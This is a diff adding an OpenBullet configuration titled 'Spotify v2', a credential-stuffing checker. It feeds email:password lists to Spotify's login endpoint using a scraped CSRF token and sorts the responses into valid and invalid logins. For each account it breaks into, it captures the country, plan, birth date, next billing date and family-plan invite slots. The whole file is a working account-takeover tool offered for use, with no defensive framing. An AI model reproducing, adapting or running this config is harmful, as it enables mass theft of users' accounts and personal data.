@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-a649c08b884cdd191f9726414552e0ce-LoliKEY",
+  "Name": "Spotify v2",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-28T10:56:14.6691344+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/fr/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accounts" 
+  KEYCHAIN Retry OR 
+    KEY "429" 
+
+PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"displayName\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"errorInvalidCredentials\"}" 
+
+REQUEST GET "https://www.spotify.com/fr/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Spotify Free" 
+    KEY "Premium Paused" 
+
+#PAYS PARSE "<SOURCE>" CSS "#card-profile-country" "innerHTML" -> CAP "PAYS" 
+
+#PLAN PARSE "<SOURCE>" LR "<h3 class=\"product-name\">" "<" -> CAP "Plan" 
+
+#Anniverssaire PARSE "<SOURCE>" CSS "#card-profile-dob" "innerHTML" -> CAP "Anniverssaire" 
+
+REQUEST GET "https://www.spotify.com/fr/account/subscription/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#paiement_datte PARSE "<SOURCE>" CSS "body > div.wrap > div > div.content-wrapper > div > div > div.col-sm-9 > div > div.content-top > div > div:nth-child(2) > div > p.subscription-status > b.recurring-date" "innerHTML" -> CAP "Datte du prochain prélevement" 
+
+REQUEST GET "https://www.spotify.com/fr/family/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "familyPlanData:" "formFields:" -> VAR "family" 
+
+FUNCTION CountOccurrences "x22canInvite\x22\x3Afalse" "<family>" -> CAP "Nombre d'invite" 
+
+!REQUEST GET "https://www.spotify.com/googlehome/register/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK 
+!  KEYCHAIN Custom "CUSTOM" OR 
+!    KEY "Démarrer mon abonnement Spotify Famille" 
+!    KEY "Désolés, mais cette offre n'est pas disponible dans votre pays" 
+!    KEY ">Vérifier la disponibilité.<" 
+!  KEYCHAIN Success OR 
+!    KEY "<SOURCE>" DoesNotContain "Démarrer mon abonnement Spotify Famille" 
+!    KEY "<SOURCE>" DoesNotContain "Désolés, mais cette offre n'est pas disponible dans votre pays" 
+!    KEY "<SOURCE>" DoesNotContain ">Vérifier la disponibilité.<" 
+
